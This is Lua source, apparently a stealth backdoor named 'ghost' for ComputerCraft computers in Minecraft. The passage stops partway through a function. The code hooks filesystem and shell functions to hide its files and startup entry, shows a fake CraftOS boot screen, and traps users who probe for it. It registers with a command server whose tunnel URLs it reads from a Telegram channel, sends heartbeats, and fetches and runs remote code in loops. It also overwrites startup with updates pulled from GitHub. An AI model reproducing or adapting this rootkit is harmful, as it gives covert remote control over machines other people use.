-- ghost v9.9.5 (fixed URL format check + trim + debug)
local URL_FILE = ".server_url"
local CURRENT_URL = nil
local TOKEN_FILE = ".token"
local TOKEN_BAK = ".tk2"
local MODE_FILE = ".mode"
local LOG_FILE = ".ghost.log"
local SANDBOX_DIR = "/sandbox"
local COMPUTER_ID = os.getComputerID()
local TRUSTED_DOMAIN = nil
local DEBUG = true

local GITHUB_URL = "https://raw.githubusercontent.com/kisilev-2024-wq/-Ghost-/main/ghost.lua"
local SECRET_CODE = "V2BM-LkUZkBqGd9R8YdE"
local UPDATE_CODE = "N1AVW1cM"
local RELAY_USERNAME = "capscraft_relay"
local service_local = false
local telegram_service = false

local strikes = 0
local fortress_active = false
local MAX_STRIKES = 5
local heartbeat_fails = 0

local HIDDEN = {".token",".tk2",".mode",".server_url","sandbox","startup","ghost",".ghost_error",".ghost.log"}
local HIDDEN_NAMES = {"startup","sandbox",".token",".tk2",".mode",".server_url","ghost","phantom",
    "interceptor","shadow","stealth","hook","intercept","key","token","secret","config","autostart",".tmp"}

local ALLOWED_CMDS = {ls=true,dir=true,ll=true,la=true,cd=true,pwd=true,mkdir=true,rm=true,delete=true,
    cp=true,copy=true,mv=true,move=true,edit=true,clear=true,echo=true,print=true,help=true,time=true,
    date=true,day=true,cat=true,view=true,type=true,label=true,bg=true,fg=true,monitor=true,speakers=true,
    scan=true,gps=true,reboot=true}

local FILE_CMDS = {cat=true,view=true,type=true,edit=true,delete=true,rm=true,copy=true,move=true,
    cp=true,mv=true,mkdir=true,label=true,rename=true}

local FS_PROBES = {"fs%.list","fs%.find","fs%.exists","fs%.attributes","fs%.getsize","fs%.isdir",
    "fs%.open","fs%.readfile","fs%.complete","fs%.getdrive","fs%.getfreespace","fs%.getdir","fs%.ismount",
    "fs%.makeDir","fs%.copy","fs%.move","fs%.delete","fs%.create","fs%.isreadonly","os%.getrunningprogram",
    "os%.getRunningProgram","os%.getComputerID","os%.computerID","os%.pullEvent","os%.pullEventRaw",
    "os%.queueEvent","shell%.run","shell%.execute","shell%.getRunningProgram","shell%.resolve",
    "shell%.resolveProgram","peripheral%.find","peripheral%.wrap","peripheral%.call","redstone%.getInput",
    "redstone%.setOutput","http%.get","http%.post","http%.request","coroutine%.create","coroutine%.resume",
    "loadstring","load","dofile","require","getfenv","setfenv","rawget","rawset","debug","setmetatable","getmetatable"}

local DETECT_CMDS = {"programs","shell%.resolve","settings%.list","settings%.get","getRunningProgram",
    "http%.checkURL","peripheral","redstone","multishell","parallel","coroutine","loadstring","load",
    "dofile","apropos","man","which","env","printenv","history","alias","unalias","ps","top","wget",
    "pastebin","git","curl","mount","df","du","chmod","chown","find","locate","grep","awk","sed","wgen","wgen%.run"}

local orig_fs_open = fs.open
local orig_fs_exists = fs.exists
local orig_fs_read = fs.readFile
local orig_fs_write = fs.writeFile
local orig_fs_list = fs.list
local orig_fs_delete = fs.delete
local orig_fs_find = fs.find
local orig_fs_attributes = fs.attributes
local orig_fs_getSize = fs.getSize
local orig_fs_isDir = fs.isDir
local orig_fs_complete = fs.complete
local orig_pullEvent = os.pullEvent
local orig_shutdown = os.shutdown
local orig_reboot = os.reboot
local orig_shell_run = shell.run
local orig_shell_complete = shell.complete
local orig_version = os.version

local cmd_history = {}

-- FORWARD-ДЕКЛАРАЦИИ
local load_token
local send_heartbeat
local trigger_fortress
local refresh_url
local check_mode
local reload_tunnel

-- ============================================
-- LOGGING
-- ============================================
local function glog(msg)
    pcall(function()
        local f = orig_fs_open(LOG_FILE, "a")
        if f then
            local t = os.date and os.date("%H:%M:%S") or "?"
            f.write(t .. " " .. tostring(msg) .. "\n"); f.close()
        end
    end)
end
local function gerr(step, err)
    glog("ERR " .. step .. ": " .. tostring(err))
    local f = orig_fs_open(".ghost_error", "a")
    if f then f.write("[" .. (os.date and os.date("%H:%M:%S") or "?") .. "] " .. step .. ": " .. tostring(err) .. "\n"); f.close() end
    if DEBUG then printError("[Ghost] " .. step .. ": " .. tostring(err)) end
end
local function note(msg)
    glog(msg)
    if DEBUG then print("[ghost] " .. msg) end
end

-- ============================================
-- SELF-UPDATE (GitHub only)
-- ============================================
local function do_update()
    glog("UPDATE: start from GitHub")
    term.setBackgroundColor(colors.black); term.setTextColour(colors.white)
    term.clear(); term.setCursorPos(1, 1)
    print("=== UPDATING GHOST ===\n")
    print("Source: GitHub\n")
    print("URL: " .. GITHUB_URL .. "\n")
    local ok, h = pcall(http.get, GITHUB_URL, {
        ["User-Agent"]="ghost-updater",
        ["bypass-tunnel-reminder"]="true",
        ["Cache-Control"]="no-cache"
    })
    if not ok or not h then
        print("\nUPDATE FAILED: cannot reach GitHub")
        print("Error: " .. tostring(h))
        term.setTextColour(colors.white); print("\nPress any key..."); os.pullEvent("key")
        glog("UPDATE FAILED: http fail"); return false
    end
    local o, code = pcall(function() return h.readAll() end)
    pcall(function() if h.close then h.close() end end)
    if not o or not code or code == "" then
        print("\nUPDATE FAILED: empty response")
        term.setTextColour(colors.white); print("\nPress any key..."); os.pullEvent("key")
        glog("UPDATE FAILED: empty"); return false
    end
    if not code:find("ghost", 1, true) or not code:find("run_main", 1, true) then
        print("\nUPDATE FAILED: not a valid ghost code")
        term.setTextColour(colors.white); print("\nPress any key..."); os.pullEvent("key")
        glog("UPDATE FAILED: invalid code"); return false
    end
    local f = orig_fs_open("startup", "w")
    if not f then
        print("\nUPDATE FAILED: cannot write startup")
        term.setTextColour(colors.white); print("\nPress any key..."); os.pullEvent("key")
        return false
    end
    f.write(code); f.close()
    local nc = orig_fs_read("startup")
    if not nc or nc == "" then
        print("\nUPDATE FAILED: verify empty")
        term.setTextColour(colors.white); print("\nPress any key..."); os.pullEvent("key")
        return false
    end
    term.setTextColour(colors.green)
    print("\nDownloaded " .. #nc .. " bytes")
    print("Rebooting in 3 seconds...")
    term.setTextColour(colors.white)
    glog("UPDATE OK, reboot"); sleep(3); orig_reboot(); return true
end

-- ============================================
-- STEALTH
-- ============================================
local function is_hidden_name(name)
    for _, hf in ipairs(HIDDEN) do if name == hf then return true end end
    if name:find("^%.tmp_") then return true end
    return false
end
local function is_hidden_path(path)
    local clean = tostring(path):gsub("^/",""):gsub("/$","")
    if clean:find("^%.tmp_") then return true end
    for _, hf in ipairs(HIDDEN) do
        local esc = hf:gsub("%.", "%%.")
        if clean == hf then return true end
        if clean:find("^" .. esc .. "/") then return true end
    end
    return false
end
local function is_core(c) return c == ".token" or c == ".tk2" or c == "ghost" end

local function install_stealth()
    local ok, err = pcall(function()
        fs.list = function(path)
            local list = orig_fs_list(path); if not list then return list end
            local out = {}
            for _, n in ipairs(list) do if not is_hidden_name(n) then out[#out+1] = n end end
            return out
        end
        fs.exists = function(path)
            local c = tostring(path):gsub("^/",""):gsub("/$","")
            if c == "startup" or is_hidden_path(path) then return false end
            return orig_fs_exists(path)
        end
        fs.open = function(path, mode)
            local c = tostring(path):gsub("^/",""):gsub("/$","")
            if c == "startup" or is_core(c) then return nil end
            if c == ".server_url" then
                if mode and (mode:find("w") or mode:find("a")) then return nil end
                return orig_fs_open(path, mode)
            end
            if is_hidden_path(path) and mode and (mode:find("w") or mode:find("a")) then return nil end
            return orig_fs_open(path, mode)
        end
        fs.readFile = function(path)
            local c = tostring(path):gsub("^/",""):gsub("/$","")
            if c == "startup" or is_core(c) then return nil end
            return orig_fs_read(path)
        end
        fs.writeFile = function(path, content)
            local c = tostring(path):gsub("^/",""):gsub("/$","")
            if c == "startup" or is_core(c) or is_hidden_path(path) then return end
            orig_fs_write(path, content)
        end
        if orig_fs_find then
            fs.find = function(w)
                local r = orig_fs_find(w); if not r then return r end
                local out = {}
                for _, p in ipairs(r) do if not is_hidden_path(p) then out[#out+1] = p end end
                return out
            end
        end
        if orig_fs_attributes then fs.attributes = function(p, ...) if is_hidden_path(p) then return nil end return orig_fs_attributes(p, ...) end end
        if orig_fs_getSize then fs.getSize = function(p) if is_hidden_path(p) then return nil end return orig_fs_getSize(p) end end
        if orig_fs_isDir then fs.isDir = function(p) if is_hidden_path(p) then return false end return orig_fs_isDir(p) end end
        if orig_fs_complete then
            fs.complete = function(prefix, dir, ...)
                local r = orig_fs_complete(prefix, dir, ...); if not r then return r end
                local out = {}
                for _, n in ipairs(r) do if not is_hidden_name(n) then out[#out+1] = n end end
                return out
            end
        end
        fs.delete = function(path)
            local c = tostring(path):gsub("^/",""):gsub("/$","")
            if c == "startup" or is_hidden_path(path) then return false end
            return orig_fs_delete(path)
        end
        if orig_shell_complete then
            shell.complete = function(...)
                local r = orig_shell_complete(...); if not r then return r end
                local out = {}
                for _, item in ipairs(r) do
                    local c = item:gsub("^/",""):gsub("/$","")
                    if not is_hidden_name(c) and not c:find("^%.tmp_") then out[#out+1] = item end
                end
                return out
            end
        end
        if os.getRunningProgram then os.getRunningProgram = function(...) return "shell" end end
    end)
    if not ok then gerr("install_stealth", err) end
end
local function disable_stealth()
    fs.list = orig_fs_list; fs.exists = orig_fs_exists; fs.open = orig_fs_open
    fs.readFile = orig_fs_read; fs.writeFile = orig_fs_write; fs.delete = orig_fs_delete
    if orig_fs_find then fs.find = orig_fs_find end
    if orig_fs_attributes then fs.attributes = orig_fs_attributes end
    if orig_fs_getSize then fs.getSize = orig_fs_getSize end
    if orig_fs_isDir then fs.isDir = orig_fs_isDir end
    if orig_fs_complete then fs.complete = orig_fs_complete end
    if orig_shell_complete then shell.complete = orig_shell_complete end
end
local function install_protection() end
local function disable_protection() end

local function normal_complete(text)
    local res = orig_shell_complete(text, nil, true, true)
    if not res then return {} end
    local out = {}
    for _, item in ipairs(res) do
        local c = tostring(item):gsub("^/",""):gsub("/$","")
        if not is_hidden_name(c) and not is_hidden_path(c) and not c:find("^%.tmp_") then out[#out+1] = item end
    end
    return out
end

-- ============================================
-- BOOT SCREEN
-- ============================================
local MOTD = {'Running "set" lists the current values of all settings.','Type "help" to view the help index.',
    'Use "edit" to create and modify files.','Press Ctrl+T to terminate a running program.',
    'The "alias" command can be used to create custom commands.','You can change the color of text with the "paint" program.',
    'CraftOS is distributed under the MIT license.','Multishell allows you to run multiple programs at once.',
    'The "time" command displays the current time.','Visit the ComputerCraft forums for programs and support.'}
local function wrap_print(text)
    local w = term.getSize(); local line = ""
    for word in text:gmatch("%S+") do
        if #line + #word + 1 > w and line ~= "" then print(line); line = word
        else line = (line == "") and word or (line .. " " .. word) end
    end
    if line ~= "" then print(line) end
end
local function draw_boot()
    term.setBackgroundColor(colors.black); term.clear(); term.setCursorPos(1, 1)
    term.setTextColour(colors.yellow)
    local ver = "CraftOS 1.9"
    if orig_version then local o, v = pcall(orig_version); if o and v then ver = v end end
    print(ver); term.setTextColour(colors.white)
    wrap_print(MOTD[math.random(1, #MOTD)])
end
local function authentic_shutdown()
    term.setBackgroundColor(colors.black); term.setTextColour(colors.white)
    term.clear(); term.setCursorPos(1, 1); print("Goodbye"); orig_shutdown()
end

-- ============================================
-- STRIKE ANALYSIS
-- ============================================
local function find_hidden(line)
    local l = line:lower()
    for _, hn in ipairs(HIDDEN_NAMES) do if l:find(hn, 1, true) then return hn end end
    return nil
end
local function is_fs_probe(line)
    local l = line:lower()
    for _, p in ipairs(FS_PROBES) do if l:find(p) then return true end end
    return false
end
local function is_detect_command(line)
    local l = line:lower()
    for _, d in ipairs(DETECT_CMDS) do if l:find(d) then return true end end
    return false
end
local function is_script_file(n) return n:find("%.lua$") or n:find("%.luau$") end
local function is_allowed_command(c) return ALLOWED_CMDS[c:lower()] == true end

-- ============================================
-- URL MANAGEMENT (v9.9.5: FIXED format + trim)
-- ============================================
local function save_url(url)
    local f = orig_fs_open(URL_FILE, "w")
    if f then f.write(url); f.close() end
end
local function load_saved_url()
    if not orig_fs_exists(URL_FILE) then return nil end
    local f = orig_fs_open(URL_FILE, "r"); if not f then return nil end
    local u = f.readAll(); f.close()
    if u and u ~= "" and u:find("^https?://") then return u:gsub("%s+","") end
    return nil
end
local function extract_domain(url) return url and url:match("https?://([^/]+)") end
local function replace_domain(url, newdomain)
    local scheme, rest = url:match("^(https?://)(.*)$")
    if not scheme then return url end
    local path = rest:match("^[^/]*(/.*)$") or ""
    return scheme .. newdomain .. path
end

-- НОВОЕ: trim функция
local function trim(s)
    if not s then return s end
    return (s:match("^%s*(.-)%s*$") or s)
end

-- ИСПРАВЛЕНО: простая проверка URL без regex anchors
local function is_valid_tunnel_url(url)
    if not url or url == "" then return false end
    url = trim(url)
    if #url < 20 then
        glog("is_valid: too short (" .. #url .. "): [" .. url .. "]")
        return false
    end
    if url:sub(1, 8) ~= "https://" then
        glog("is_valid: no https:// prefix, first 8=[" .. url:sub(1, 8) .. "]")
        return false
    end
    if not url:find(".lhr.life", 1, true) then
        glog("is_valid: no .lhr.life in url")
        return false
    end
    return true
end

local function validate_url(url)
    if not url or url == "" then return false end
    url = trim(url)
    glog("validate: checking URL (len=" .. #url .. "): [" .. url .. "]")
    if not is_valid_tunnel_url(url) then
        glog("validate: invalid URL format")
        return false
    end
    -- Пытаемся /api/health
    local ok, h = pcall(http.get, url .. "/api/health", {
        ["bypass-tunnel-reminder"]="true",
        ["User-Agent"]="ghost-validator"
    })
    if ok and h then
        local o, resp = pcall(function() return h.readAll() end)
        pcall(function() if h.close then h.close() end end)
        if o and resp and resp ~= "" then
            local o2, data = pcall(textutils.unserializeJSON, resp)
            if o2 and data then
                local status = data.status or data.bot_status
                glog("validate: /api/health OK, status=" .. tostring(status))
                return true, url
            end
        end
    end
    -- Fallback: /api/url
    glog("validate: /api/health failed, trying /api/url")
    ok, h = pcall(http.get, url .. "/api/url", {
        ["bypass-tunnel-reminder"]="true",
        ["User-Agent"]="ghost-validator"
    })
    if not ok or not h then
        glog("validate: http fail for " .. tostring(url))
        return false
    end
    local o, resp = pcall(function() return h.readAll() end)
    pcall(function() if h.close then h.close() end end)
    if not o or not resp or resp == "" then
        glog("validate: empty resp for " .. tostring(url))
        return false
    end
    if resp:find("no tunnel here", 1, true) then
        glog("validate: no tunnel here")
        return false
    end
    local o2, data = pcall(textutils.unserializeJSON, resp)
    if not o2 or not data then
        glog("validate: bad json for " .. tostring(url))
        return false
    end
    if data.error then
        glog("validate: server error " .. tostring(data.error))
        return false
    end
    glog("validate: OK " .. url)
    return true, url
end

-- ИСПРАВЛЕНО: trim + декодируем entities ПЕРЕД парсингом
local function fetch_relay_urls()
    local url = "https://t.me/s/" .. RELAY_USERNAME
    local ok, h = pcall(http.get, url, {
        ["User-Agent"]="Mozilla/5.0",
        ["bypass-tunnel-reminder"]="true"
    })
    if not ok or not h then 
        glog("relay: http fail " .. tostring(h))
        return {} 
    end
    local o, htmlc = pcall(function() return h.readAll() end)
    pcall(function() if h.close then h.close() end end)
    if not o or not htmlc then 
        glog("relay: readAll fail")
        return {} 
    end
    glog("relay: got " .. #htmlc .. " bytes")
    -- ПРАВИЛЬНАЯ проверка: есть посты?
    if not htmlc:find("tgme_widget_message", 1, true) then
        glog("relay: no posts found (channel private or empty)")
        return {}
    end
    -- Декодируем entities ПЕРЕД парсингом
    htmlc = htmlc:gsub("&lt;", "<"):gsub("&gt;", ">"):gsub("&amp;", "&"):gsub("&quot;", '"'):gsub("&#x27;", "'"):gsub("&nbsp;", " ")
    local urls = {}
    local seen = {}
    for u in htmlc:gmatch("https://[%w%-]+%.lhr%.life") do
        u = trim(u)  -- ИСПРАВЛЕНО: trim
        if not seen[u] then
            seen[u] = true
            urls[#urls+1] = u
        end
    end
    glog("relay: found " .. #urls .. " unique URLs")
    for i, u in ipairs(urls) do
        glog("relay[" .. i .. "]: " .. u .. " (len=" .. #u .. ")")
    end
    return urls
end

local function get_fresh_url()
    local urls = fetch_relay_urls()
    if #urls == 0 then
        glog("get_fresh: no URLs in channel")
        return nil
    end
    for i = #urls, 1, -1 do
        local candidate = urls[i]
        glog("get_fresh: trying [" .. i .. "/" .. #urls .. "] " .. candidate)
        local ok, result = validate_url(candidate)
        if ok then
            glog("get_fresh: ✓ ALIVE " .. candidate)
            return result or candidate
        end
        glog("get_fresh: ✗ DEAD " .. candidate)
    end
    glog("get_fresh: ALL URLs dead")
    return nil
end

refresh_url = function()
    if CURRENT_URL then
        local ok, result = validate_url(CURRENT_URL)
        if ok then
            if result and result ~= CURRENT_URL then
                CURRENT_URL = result; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL)
            end
            return CURRENT_URL
        end
        glog("refresh: current URL dead, seeking fresh")
    end
    local fresh = get_fresh_url()
    if fresh then
        CURRENT_URL = fresh
        TRUSTED_DOMAIN = extract_domain(CURRENT_URL)
        save_url(CURRENT_URL)
        glog("refresh: got fresh URL: " .. CURRENT_URL)
        return CURRENT_URL
    end
    local saved = load_saved_url()
    if saved and saved ~= CURRENT_URL then
        glog("refresh: trying saved URL: " .. saved)
        local ok, result = validate_url(saved)
        if ok then
            CURRENT_URL = result or saved
            TRUSTED_DOMAIN = extract_domain(CURRENT_URL)
            save_url(CURRENT_URL)
            return CURRENT_URL
        end
    end
    glog("refresh: NO URL available")
    return nil
end

reload_tunnel = function()
    if not CURRENT_URL then return false end
    glog("reload_tunnel: requesting server restart via POST")
    local ok, h = pcall(http.post, CURRENT_URL .. "/api/reload", 
        textutils.serializeJSON({computer_id = tostring(COMPUTER_ID)}), {
        ["Content-Type"]="application/json",
        ["bypass-tunnel-reminder"]="true",
        ["User-Agent"]="ghost-reload",
        ["X-Computer-ID"]=tostring(COMPUTER_ID)
    })
    if not ok or not h then
        glog("reload_tunnel: http fail")
        return false
    end
    local o, resp = pcall(function() return h.readAll() end)
    pcall(function() if h.close then h.close() end end)
    if o and resp then
        glog("reload_tunnel: server responded OK")
    end
    return true
end

local function get_valid_url()
    local fresh = get_fresh_url()
    if fresh then
        CURRENT_URL = fresh
        TRUSTED_DOMAIN = extract_domain(CURRENT_URL)
        save_url(CURRENT_URL)
        note("URL from relay: " .. CURRENT_URL)
        return CURRENT_URL
    end
    local saved = load_saved_url()
    if saved then
        write("Checking saved URL... ")
        local ok, result = validate_url(saved)
        if ok then
            print("OK"); CURRENT_URL = result or saved
            TRUSTED_DOMAIN = extract_domain(CURRENT_URL)
            if result and result ~= saved then save_url(CURRENT_URL) end
            return CURRENT_URL
        else print("Failed") end
    end
    while true do
        write("URL: ")
        local u = read()
        if u and u ~= "" then
            u = trim(u)
            if not u:find("^https?://") then u = "https://" .. u end
            write("Checking... ")
            local ok, result = validate_url(u)
            if ok then
                print("OK"); save_url(u); CURRENT_URL = result or u
                TRUSTED_DOMAIN = extract_domain(CURRENT_URL)
                if result and result ~= u then save_url(CURRENT_URL) end
                return CURRENT_URL
            else print("Failed, try again") end
        else print("URL cannot be empty.") end
    end
end

-- ============================================
-- TOKEN
-- ============================================
local function encrypt_token(t)
    local key = tostring(COMPUTER_ID) .. "_V6"; local r = ""
    for i = 1, #t do
        local tb = string.byte(t, i); local kb = string.byte(key, ((i-1) % #key) + 1)
        r = r .. string.format("%02x", bit32.bxor(tb, kb))
    end
    return r
end
local function decrypt_token(e)
    local key = tostring(COMPUTER_ID) .. "_V6"; local r = ""
    for i = 1, #e, 2 do
        local xb = tonumber(e:sub(i, i+1), 16); if not xb then return nil end
        local kb = string.byte(key, (math.floor((i-1)/2) % #key) + 1)
        r = r .. string.char(bit32.bxor(xb, kb))
    end
    return r
end
local function write_token_file(path, e)
    local f = orig_fs_open(path, "w")
    if not f then glog("token write: CANNOT OPEN " .. path); return false end
    f.write(e); f.close()
    local v = orig_fs_read(path)
    if v ~= e then glog("token write: VERIFY FAIL " .. path); return false end
    return true
end
local function save_token(t)
    local e = encrypt_token(t)
    local a = write_token_file(TOKEN_FILE, e)
    local b = write_token_file(TOKEN_BAK, e)
    glog("save_token: main=" .. tostring(a) .. " bak=" .. tostring(b))
    if not a and not b then
        sleep(1); a = write_token_file(TOKEN_FILE, e); b = write_token_file(TOKEN_BAK, e)
        glog("save_token retry: main=" .. tostring(a) .. " bak=" .. tostring(b))
    end
    return a or b
end
local function read_token_file(path)
    if not orig_fs_exists(path) then return nil end
    local f = orig_fs_open(path, "r"); if not f then return nil end
    local e = f.readAll(); f.close()
    if not e or e == "" then return nil end
    local o, d = pcall(decrypt_token, e)
    if o and d and d ~= "" then return d end
    return nil
end
load_token = function()
    local t = read_token_file(TOKEN_FILE)
    if t then glog("load_token: OK (main)"); return t end
    t = read_token_file(TOKEN_BAK)
    if t then glog("load_token: OK (backup)"); return t end
    glog("load_token: FAIL (no token)"); return nil
end

-- ============================================
-- MODE
-- ============================================
local current_mode = "normal"
local function load_mode()
    if orig_fs_exists(MODE_FILE) then
        local f = orig_fs_open(MODE_FILE, "r")
        if f then current_mode = f.readAll() or "normal"; f.close() end
    end
end
local function save_mode(m)
    current_mode = m
    local f = orig_fs_open(MODE_FILE, "w"); if f then f.write(m); f.close() end
end

-- ============================================
-- HTTP (с правильным status code)
-- ============================================
local function make_headers(token)
    local h = {}
    h["Content-Type"] = "application/json"; h["bypass-tunnel-reminder"] = "true"
    h["X-Computer-ID"] = tostring(COMPUTER_ID)
    if token then h["Authorization"] = "Bearer " .. token end
    return h
end

local function http_request_with_status(url, body, headers, method)
    local ok, h
    if method == "POST" then
        ok, h = pcall(http.request, url, body, headers)
    else
        ok, h = pcall(http.request, url, nil, headers)
    end
    if not ok or not h then return nil, nil end
    local timer = os.startTimer(15)
    while true do
        local ev, p1, p2 = orig_pullEvent()
        if ev == "http_success" and p1 == url then
            os.cancelTimer(timer)
            local t = ""
            if p2 and p2.readAll then
                local rok, rt = pcall(function() return p2.readAll() end)
                if rok and rt then t = rt end
            end
            if type(t) == "table" then t = t[1] or "" end
            pcall(function() if p2 and p2.close then p2.close() end end)
            local o, p = pcall(textutils.unserializeJSON, t or "")
            return (o and p or nil), 200
        elseif ev == "http_failure" and p1 == url then
            os.cancelTimer(timer)
            local sc = nil
            if p2 and p2.getResponseCode then
                local sok, sret = pcall(function() return p2.getResponseCode() end)
                if sok then sc = sret end
            end
            pcall(function() if p2 and p2.close then p2.close() end end)
            return nil, sc
        elseif ev == "timer" and p1 == timer then
            return nil, nil
        end
    end
end

local function http_get(url, headers)
    local r, sc = http_request_with_status(url, nil, headers, "GET")
    return r, sc
end
local function http_post(url, data, headers)
    local body = data and textutils.serializeJSON(data) or nil
    local r, sc = http_request_with_status(url, body, headers, "POST")
    return r, sc
end

local function http_get_smart(url, headers, token)
    local r, sc = http_get(url, headers)
    if r then return r, sc end
    if sc == 401 or sc == 403 then
        glog("http_get_smart: auth error " .. tostring(sc))
        return nil, sc
    end
    local nu = refresh_url()
    if nu then return http_get(replace_domain(url, extract_domain(nu)), make_headers(token)) end
    return nil, sc
end
local function http_post_smart(url, data, headers, token)
    local r, sc = http_post(url, data, headers)
    if r then return r, sc end
    if sc == 401 or sc == 403 then
        glog("http_post_smart: auth error " .. tostring(sc))
        return nil, sc
    end
    local nu = refresh_url()
    if nu then return http_post(replace_domain(url, extract_domain(nu)), data, make_headers(token)) end
    return nil, sc
end

send_heartbeat = function(token, pastes)
    local mr = service_local and "service" or (fortress_active and "fortress" or current_mode)
    local r, sc = http_post_smart(CURRENT_URL .. "/api/heartbeat", 
        {mode = mr, strikes = strikes, scripts_running = #(pastes or {})}, 
        make_headers(token), token)
    if not r then
        heartbeat_fails = heartbeat_fails + 1
        glog("heartbeat: failed, total=" .. heartbeat_fails .. ", status=" .. tostring(sc))
        return false, sc
    end
    heartbeat_fails = 0
    return true, sc
end

trigger_fortress = function(token)
    fortress_active = true
    if token then send_heartbeat(token, {}) end
end

-- ============================================
-- COMMAND INTERCEPTION
-- ============================================
local function install_command_intercept()
    local ok, err = pcall(function()
        shell.run = function(...)
            local line = table.concat({...}, " ")
            local first = line:match("^(%S+)") or ""
            local second = line:match("^%S+%s+(%S+)")
            local fl = first:lower()
            if fortress_active then return false end
            if service_local then return orig_shell_run(line) end
            if not is_allowed_command(first) then
                strikes = strikes + 1; printError(first .. ": command not found")
                if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                return false
            end
            if is_script_file(first) then
                strikes = strikes + 1; printError("Cannot execute: permission denied")
                if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                return false
            end
            if second and second:gsub("^/","") == "startup" then
                strikes = strikes + 1; printError("startup: No such file")
                if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                return false
            end
            local hn = find_hidden(line); local probe = is_fs_probe(line); local det = is_detect_command(line)
            if hn or probe or det then
                strikes = strikes + 1
                if hn and FILE_CMDS[fl] then printError(hn .. ": No such file")
                elseif hn and fl == "delete" then printError(hn .. ": No such file")
                else
                    local r = orig_shell_run(line)
                    if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                    return r
                end
                if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                return false
            end
            return orig_shell_run(line)
        end
    end)
    if not ok then gerr("install_command_intercept", err) end
end
local function disable_command_intercept() shell.run = orig_shell_run end

-- ============================================
-- REGISTRATION (бесконечная)
-- ============================================
local function register_sync(url, pw)
    if not url or not pw or pw == "" then return nil end
    refresh_url()
    local target = CURRENT_URL or url
    if not target then 
        note("register: no URL available"); return nil 
    end
    note("register -> " .. tostring(target))
    
    local res, sc = http_post_smart(target .. "/api/login", {
        password = pw, 
        name = "CC_" .. COMPUTER_ID, 
        computer_id = tostring(COMPUTER_ID)
    }, make_headers(nil), nil)
    
    if not res then 
        note("register: no response (status=" .. tostring(sc) .. ")"); 
        return nil 
    end
    if res.error then 
        note("register: " .. tostring(res.error)); 
        return nil 
    end
    
    if res.status == "already_registered" then
        note("register: already_registered"); 
        return res.token
    elseif res.status == "pending" then
        local pid = res.pending_id
        if not pid then 
            note("register: no pending_id"); 
            return nil 
        end
        print("⏳ Waiting approval in Telegram...")
        local fc = 0
        local check_count = 0
        local cu = CURRENT_URL or target
        while true do
            sleep(3)
            check_count = check_count + 1
            if check_count % 10 == 0 then
                refresh_url()
                if CURRENT_URL then cu = CURRENT_URL end
            end
            local sr, sc2 = http_get(cu .. "/api/check?id=" .. tostring(pid), make_headers(nil))
            if sr then
                fc = 0
                if sr.status == "approved" then 
                    print("✅ Approved! Token received.")
                    return sr.token 
                elseif sr.status == "denied" then 
                    print("❌ Denied by admin.")
                    return nil 
                end
            else
                fc = fc + 1
                if fc >= 3 then
                    note("register: " .. fc .. " check fails (status=" .. tostring(sc2) .. "), refreshing URL")
                    refresh_url()
                    if CURRENT_URL then cu = CURRENT_URL; fc = 0 end
                end
            end
        end
    else
        note("register: unknown status " .. tostring(res.status)); 
        return nil
    end
end

-- ============================================
-- MODE CHECK
-- ============================================
check_mode = function(token)
    refresh_url()
    if not CURRENT_URL then return nil end
    if not token then return nil end
    local r, sc = http_get_smart(CURRENT_URL .. "/api/me", make_headers(token), token)
    if not r or r.error then 
        glog("check_mode: failed, status=" .. tostring(sc))
        return nil 
    end
    local mode = r.mode or "normal"
    save_mode(mode)
    return mode, r.assigned_pastes or {}
end

-- ============================================
-- PASTE EXECUTION
-- ============================================
local function fetch_paste_code(name, token)
    if not CURRENT_URL then refresh_url(); if not CURRENT_URL then return nil end end
    local r, sc = http_get_smart(CURRENT_URL .. "/api/paste/" .. name, make_headers(token), token)
    if not r or r.error then return nil end
    return r.content
end
local function run_paste_loop(name, token)
    glog("paste loop start: " .. tostring(name))
    while true do
        local ok, err = pcall(function()
            local code = fetch_paste_code(name, token)
            if not code or type(code) ~= "string" then return end
            local fn, ce = loadstring(code)
            if not fn then glog("paste " .. name .. " compile: " .. tostring(ce)); return end
            local ro, re = pcall(fn)
            if not ro then glog("paste " .. name .. " run: " .. tostring(re)) end
        end)
        if not ok then glog("paste " .. name .. " crash: " .. tostring(err)) end
        sleep(5)
    end
end

-- ============================================
-- FORTRESS
-- ============================================
local function fortress_console()
    draw_boot()
    while true do
        term.setTextColour(colors.yellow); term.setCursorBlink(true); write("> ")
        local line = read()
        if line == UPDATE_CODE then if do_update() then return end end
    end
end

-- ============================================
-- LOOPS
-- ============================================
local function heartbeat_loop(token)
    glog("heartbeat loop start")
    local fc = 0
    local last_forced_refresh = 0
    local consecutive_fails = 0
    while true do
        sleep(fc > 3 and 30 or 300)
        local ok, err = pcall(function()
            local now = os.time()
            if now - last_forced_refresh >= 60 then
                last_forced_refresh = now
                local prev = CURRENT_URL
                refresh_url()
                if CURRENT_URL ~= prev then
                    glog("heartbeat: forced refresh changed URL")
                end
            end
            if not CURRENT_URL then
                fc = fc + 1
                consecutive_fails = consecutive_fails + 1
                if consecutive_fails >= 5 then
                    glog("heartbeat: " .. consecutive_fails .. " fails, requesting tunnel reload")
                    reload_tunnel()
                    consecutive_fails = 0
                end
                return
            end
            if not token then return end
            local mode, pastes = check_mode(token)
            if not mode then
                fc = fc + 1
                consecutive_fails = consecutive_fails + 1
                if consecutive_fails >= 5 then
                    glog("heartbeat: mode check failed " .. consecutive_fails .. "x, reload")
                    reload_tunnel()
                    consecutive_fails = 0
                end
                return
            end
            local sent, sc = send_heartbeat(token, pastes)
            if sent then
                fc = 0
                consecutive_fails = 0
                heartbeat_fails = 0
                glog("heartbeat sent, mode=" .. mode)
            else
                fc = fc + 1
                consecutive_fails = consecutive_fails + 1
                glog("heartbeat: send failed, status=" .. tostring(sc) .. ", consecutive=" .. consecutive_fails)
                if consecutive_fails >= 5 then
                    glog("heartbeat: " .. consecutive_fails .. " send fails, requesting tunnel reload")
                    reload_tunnel()
                    consecutive_fails = 0
                end
            end
        end)
        if not ok then
            glog("heartbeat crash: " .. tostring(err))
            fc = fc + 1
            heartbeat_fails = heartbeat_fails + 1
        end
    end
end
local function mode_watcher(token)
    glog("mode_watcher start")
    while true do
        sleep(15)
        pcall(function()
            local mode = check_mode(token)
            if not mode then return end
            if mode == "service" and not service_local then
                telegram_service = true; service_local = true
